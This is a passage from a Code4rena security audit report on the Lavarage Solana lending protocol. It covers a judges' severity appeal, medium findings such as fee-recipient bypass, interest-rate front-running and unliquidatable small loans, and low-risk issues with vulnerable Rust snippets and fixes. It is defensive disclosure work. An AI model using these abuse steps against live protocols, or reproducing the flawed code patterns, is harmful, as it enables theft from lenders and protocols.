> The reasoning can be extended to make all grieving attacks of critical severity, which isn't fair to attacks where the attacker obtains an actual profit.

**[DadeKuma (warden) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2112990596):**
 > It's not future income as interest is accrued daily. High risk means that funds can be compromised directly (it's worth noting that this isn't a dust amount, and any borrower can do it). The actual rules say nothing about griefing, and borrowing/lending is a core feature of this protocol.
> 
> There are multiple scenarios:
> 
>**Scenario 1:** The borrower locks collateral but they recoup some immediately by taking the borrowed amount. The lender has no access to any funds until liquidation, which can't be enforced as interest is not accrued. For a % cost of the total borrowed amount, the attacker can lock a sizeable capital forever.
>**Scenario 2:** There is no attacker, and a borrower has lost access to their wallet. The loan remains unliquidable forever, and the lender loses 100% of the capital as there is no time limit for a loan (like described in [#9](https://github.com/code-423n4/2024-04-lavarage-findings/issues/9) which was duped to this issue).

**[Picodes (Appellate Court lead judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10#issuecomment-2120378547):**
>
 > ## Lavarage Appellate Court Decisions
> 
> ### Summary
>
> Issue [#10](https://github.com/code-423n4/2024-04-lavarage-findings/issues/10) describes how because loans have no fixed duration and interests are not taken into account into the liquidiation mechanism, lenders cannot count on interests to trigger a liquidation at some point in the future, and there is a point time after which it isn't profitable anymore for the borrower to pay back its loan.
> It's related to [#9](https://github.com/code-423n4/2024-04-lavarage-findings/issues/9) which focuses on the business implications of having infinite duration loans. 
> 
> ### Lavarage's (sponsor) input:
>
> The sponsor was asked for his input on the original design he had in mind and the value added by #9 and #10. Here is his answer:
> 
>> "I can confirm that the design I am willing to implement is that loans do not have a fixed term. But I also agree that that could be a risk on the business logic side. However, we are looking into implementing interest payment collection through sales of collateral instead of setting a fixed time for the loans. As mentioned above I agree that #9 is a valid concern in regards of business logic design. I don't think we have discussed it in our documentation."
> 
> ### Picodes' (lead judge) view:
> 
> I think H is more appropriate as well. For sure there will be users leverage trading and losing their borrowed amount, losing their keys, etc, and the main backstop for lenders is that due to interests they will get their collateral back at some point. That's the classic behavior for Aave, Compound, Morpho, etc. Without this they can only rely on price movements which isn't the deal. As a proof I think Aave V2 or deprecated lending markets speaks for themselves where lenders are just waiting for liquidations to be able to withdraw and the amounts at stake are significant.
>
> ### 0xTheC0der’s (judge 2) view:
>
> I am viewing this from the following perspectives:
> - **Adversary:** Is never at a profit by not repaying the loan. Would have been better off just swapping the collateral for the borrowed asset. Therefore, a grieving attack and no theft of assets.
> - **Protocol:** Missing out on interest (loss of yield), but no direct theft. Collateral is unusable/locked until price swing allows liquidation on LTV > 90%, could be pretty permanent in case of stable assets. Bad debt once interest accrual puts actual LTV > 100%, but only "in the books" i.e. no direct loss.
> 
> Leaning towards High severity due to the indefinite lockup of collateral assets even without malicious user intent which effectively translates into a loss of the value of the borrowed assets. While the warden deserves to have their finding upgraded to High severity, this is a borderline case and also the audit judge's assessment of Medium severity seems to hold under C4 rules and therefore cannot be labeled a "clear mistake" as the appellate court rules currently suggest in case of a 3/3 agreement on High severity. Consequently, I want my final verdict to be interpreted in such a way that a 2/3 agreement on High severity is reached. 
> 
> ### Hickuphh3’s (judge 3) view:
>
> I think H severity is more appropriate, not because of the loss of unrealised yield (this would be M), but because of the collateral that the lender is entitled to can be indefinitely locked, as long as LTV is <= 90%.
> 
> Should interest accrual be accounted for, the position will eventually be liquidatable at some point, but excluding it means the condition may only be met from asset price changes
> 
> ### Verdict
> 
> By a 2/3 consensus, the conclusion from the appellate court is that the ruling should be overruled and the issue should be made of **High severity**.

*Note, this finding was upgraded to High by C4 staff in reference to the Appellate Court decision.*

***

# Medium Risk Findings (4)

## [[M-01] Lack of freeze authority check for collateral tokens on create trading pool](https://github.com/code-423n4/2024-04-lavarage-findings/issues/31)
*Submitted by [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/31)*

SPL tokens are used as collateral in the protocol. On borrow, there is a transfer from the borrower into a PDA (position account). On repay, the other way around.

However, SPL token could have a freeze authority. Therefore, any account is vulnerable to be frozen. This could be harmful for both borrowers and lenders. I believe, The protocol should be resilient enough to not fall into such situations where the funds are locked and borrowing or repaying are DoSed.

### Proof of Concept

There is no check for freeze authority of the mint (i.e. token).

More info on freeze authority feature:

> The Mint may also contain a `freeze_authority` which can be used to issue `FreezeAccount` instructions that will render an Account unusable. Token instructions that include a frozen account will fail until the Account is thawed using the `ThawAccount` instruction. The `SetAuthority` instruction can be used to change a Mint's `freeze_authority`. If a Mint's `freeze_authority` is set to `None` then account freezing and thawing is permanently disabled and all currently frozen accounts will also stay frozen permanently.

[SPL Token#freezing-accounts](https://spl.solana.com/token#freezing-accounts)

### Recommended Mitigation Steps

Ensure the collateral token does not have an active `freeze_authority`. If the `freeze_authority` was set to `None`, then freezing feature can never work again.

### Assessed type

Access Control

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/31#issuecomment-2087852878)**

**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/31#issuecomment-2105132486):**
 > Even given that this will be an exceedingly rare event, there will be losses to innocent users if the account of a trading pool becomes frozen. Given that this is an avoidable issue, the severity stays as Medium.

***

## [[M-02] Borrowers can avoid the payment of an interest share fee by setting themselves as a `fee_receipient`](https://github.com/code-423n4/2024-04-lavarage-findings/issues/18)
*Submitted by [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/18), also found by [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/33), [DadeKuma](https://github.com/code-423n4/2024-04-lavarage-findings/issues/32), [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/19), and [rvierdiiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/3)*

`src/processor/swapback.rs#L185`

`src/processor/swapback.rs#L192`

`src/context/repay_sol.rs#L23`

### Impact

Borrowers can avoid the payment of the 20% interest share fee on their accumulated interest.

### Proof of Concept

The current implementation of the `repay_sol` function sends a 20% interest share fee to the specified `fee_receipient` account that is passed in to it. However, as it can be seen, that account is a user specified one:

```rust
    let transfer_instruction3 = system_instruction::transfer(
    &ctx.accounts.trader.key(),
    &ctx.accounts.fee_receipient.key(),
    interest_share,
    );
    anchor_lang::solana_program::program::invoke(
        &transfer_instruction3,
        &[
            ctx.accounts.trader.to_account_info(),
            ctx.accounts.fee_receipient.to_account_info(),
        ],
    )?;
```

```rust
    /// CHECK: We just want the value of this account
    #[account(mut)]
    pub fee_receipient: UncheckedAccount<'info>,
```

What this means, is that the user can take advantage of that and avoid the payment of an interest share fee by simply passing in a public key that is controlled by them for that value. It is unclear who exactly is supposed to be the on the receiving end for the fee payment, but what's important is that that they can easily be easily be prevented from receiving it.

### Recommended Mitigation Steps

Apply some restrictions on the `fee_receipient` public key value. For example, you can make it be a property of the `Pool` struct that is set on the creation of each new trading pool by its operator.

### Assessed type

Invalid Validation

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/18#issuecomment-2087770512)**

***

## [[M-03] Innocent borrower could incur losses caused by a malicious lender](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17)
*Submitted by [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17)*

The protocol allows the lender to change the interest rate anytime. However, since the new interest rate is stored on trading pool level, the lender could front-run a borrowing transaction that's yet to be processed, updating the interest rate too high (up to 99). This is harmful to the borrower even if the borrower repays the SOL immediately.
That's because the minimum elapsed days on repay is set to be one

```rust
  let days_elapsed = ((current_timestamp - timestamp) as u64 / 86400) + 1; // +1 to ensure interest is charged from day 0
```

`src/processor/swapback.rs#L145`

### Proof of Concept

Update interest rate on pool level:

`src/processor/lending.rs#L38-L51`

Minimum elapsed days is 1:

    ```rust
      let days_elapsed = ((current_timestamp - timestamp) as u64 / 86400) + 1; // +1 to ensure interest is charged from day 0
    ```

`src/processor/swapback.rs#L145`

### Recommended Mitigation Steps

Allow the borrower to pass maximum interest rate, this protects the borrower from any change of the interest rate that occur after they send their TX.

Another suggestion: store the interest rate on position level instead.

**[piske-alex (Lavarage) confirmed and commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17#issuecomment-2087769388):**
 > > Another suggestion: store the interest rate on position level instead.
> 
> Will implement max interest rate param. How do I store the interest rate on position before the position is created?


**[Koolex (warden) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17#issuecomment-2088199727):**
 > @piske-alex - That's a very good point, as it can still be front-run.
> 
> However, if you still would like to avoid passing the interest rate as a param, interest rate should be stored in trading pool with `updated_time`, then on borrowing, check if there is not enough timespan between current timestamp and `updated_time`, revert accordingly. Otherwise, proceed and store the interest rate (for records only).
> 
> This should be a sufficient protection without requiring the user to pass max interest rate as a param due to the fact that, a Solana TX has an expiration time. So, if it is not processed within a certain time, it will never be.
> 
> > During transaction processing, Solana Validators will check if each transaction's recent blockhash is recorded within the most recent 151 stored hashes (aka "max processing age"). If the transaction's recent blockhash is [older than this](https://github.com/anza-xyz/agave/blob/cb2fd2b632f16a43eff0c27af7458e4e97512e31/runtime/src/bank.rs#L3570-L3571) max processing age, the transaction is not processed.
> 
> Check [this](https://solana.com/docs/advanced/confirmation#how-does-transaction-expiration-work) for more info.

**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17#issuecomment-2105119034):**
 > Front-running by validators is possible in Solana, and after a brief analysis of the current situation, concerning to some users. This issue can cause mild losses to users. Nothing major, but a headache for the protocol that will have to deal with the complaints and possibly refunds. Affected users would have to close their positions immediately if they notice the issue. All in all, a medium is a fair severity rating.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-lavarage-findings/issues/17).*

***

## [[M-04] Small loans will never be liquidated, generating bad debt for lenders](https://github.com/code-423n4/2024-04-lavarage-findings/issues/11)
*Submitted by [DadeKuma](https://github.com/code-423n4/2024-04-lavarage-findings/issues/11), also found by [adeolu](https://github.com/code-423n4/2024-04-lavarage-findings/issues/7)*

There isn't a minimum position requirement for borrowers when they start a loan. Malicious borrowers might abuse this to create a large amount of small loans that will be unprofitable to liquidate. This results in a total loss of funds for lenders as they will get only bad debt.

### Proof of Concept

1. A malicious borrower starts (`src/processor/swap.rs#L12`) multiple loans with extremely low amounts of funds borrowed in each one, in a single transaction (by chaining `borrow - add_collateral - borrow - ...` with different positions on the same pool). They get the same amount of funds as they would have got with a single big loan AND they pay just for a single transaction.
2. When the LTV goes `> 90%`, the lender should liquidate (`src/processor/liquidate.rs#L19`) each of these loans, but it will be unprofitable to do so, as they NEED to execute and pay for multiple transactions.
3. The lender will never liquidate all the loans (as it's unprofitable) so they only get bad debt.

### Recommended Mitigation Steps

Consider implementing a minimum amount to start a loan.

### Assessed type

Invalid Validation

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/11#issuecomment-2087757037)**

**[alcueca (judge) decreased severity to Medium](https://github.com/code-423n4/2024-04-lavarage-findings/issues/11#issuecomment-2088570251)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-lavarage-findings/issues/11).*
***

# Low Risk and Non-Critical Issues

For this audit, 5 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-04-lavarage-findings/issues/27) by **DadeKuma** received the top score from the judge.

*The following wardens also submitted reports: [Arabadzhiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/29), [Koolex](https://github.com/code-423n4/2024-04-lavarage-findings/issues/20), [rvierdiiev](https://github.com/code-423n4/2024-04-lavarage-findings/issues/12), and [adeolu](https://github.com/code-423n4/2024-04-lavarage-findings/issues/2).*

## [L-01] Users can avoid paying borrowing fees

Users might submit an account they control as the `fee_account`. If the intention is to use just one account to gather fees, consider hardcoding the address instead of passing it as an argument:

```rust
**fee_account.try_borrow_mut_lamports()? += fee; 
```

`src/processor/swap.rs#L78`

## [L-02] Off-by-one LTV check

[Docs](https://lavarage.gitbook.io/lavarage/key-parameters) specify that positions are liquidated when `>= 90%` LTV, but this is not the case:

```rust
require!(ctx.accounts.position_account.amount * 1000 / position_size  > 900, FlashFillError::ExpectedCollateralNotEnough );
```

Consider using `>=` instead of `>`, or change the docs accordingly.

## [L-03] Missing validations for canonical bump seed

There is a PDA check, but the code is missing a canonical bump seed check. Users should be able to specify the bump as an argument to ensure that it's the correct one:

```diff
  pub fn liquidate(
    ctx: Context<Liquidate>,
    position_size: u64,
+	bump: u64
	) -> Result<()> {
		...
		require!(pda == ctx.accounts.position_account.key() ,
			FlashFillError::AddressMismatch
    	);
		let seeds = &[
		    b"position", 
		    trader_key.as_ref(), 
		    trading_pool_key.as_ref(),
		    random_account_as_id_key.as_ref(),
		    &[bump_seed]
		];
+		require!(bump_seed == bump, FlashFillError::AddressMismatch);
```

`src/processor/liquidate.rs#L54-L64`

Another similar issue can be found also in the `borrow_collateral` (`src/processor/swapback.rs#L113-L124`) function.

## [L-04] It's possible to underflow the borrowed amount

When borrowing, is it possible to specify a `user_pays` higher than `position_size`, as a result, the borrowed amount will underflow to the max value:

```rust
ctx.accounts.position_account.amount = position_size - user_pays;
```

`src/processor/swap.rs#L16`

The entire `borrow` function will work with an extremely big amount of borrowed funds even if the user pays almost nothing. However, the function will fail anyway later as the user would have to provide a large amount of collateral anyway in `add_collateral`:

```rust
require!(
      ((amt as u128)
      .checked_mul(ctx.accounts.trading_pool.max_borrow as u128).expect("overflow")
      .checked_div(10_u128.pow(ctx.accounts.mint.decimals as u32))).expect("overflow") as u64
       >= ctx.accounts.position_account.amount, 
      FlashFillError::ExpectedCollateralNotEnough);
```

`src/processor/swap.rs#L102`

Consider using `checked_sub` anyway to remove any potential issues in the future.

## [L-05] Loans might be unliquidable if SOL value crashes

The liquidation check might overflow to a small value with the first multiplication:

```rust
require!(ctx.accounts.position_account.amount * 1000 / position_size  > 900, FlashFillError::ExpectedCollateralNotEnough );
```

The attacker needs an insane amount of SOL (2+ billion) so this attack is not feasible at the moment of writing; however, it might be in the future if SOL value crashes. If it happens, attackers can have unhealthy, unliquidable loans.

Consider using `saturating_mul` anyway to remove any potential issues in the future.

**[piske-alex (Lavarage) confirmed](https://github.com/code-423n4/2024-04-lavarage-findings/issues/27#issuecomment-2088624799)**

**[alcueca (judge) commented](https://github.com/code-423n4/2024-04-lavarage-findings/issues/27#issuecomment-2089813956):**
 > I agree with the classification of all issues reported.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and rust developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
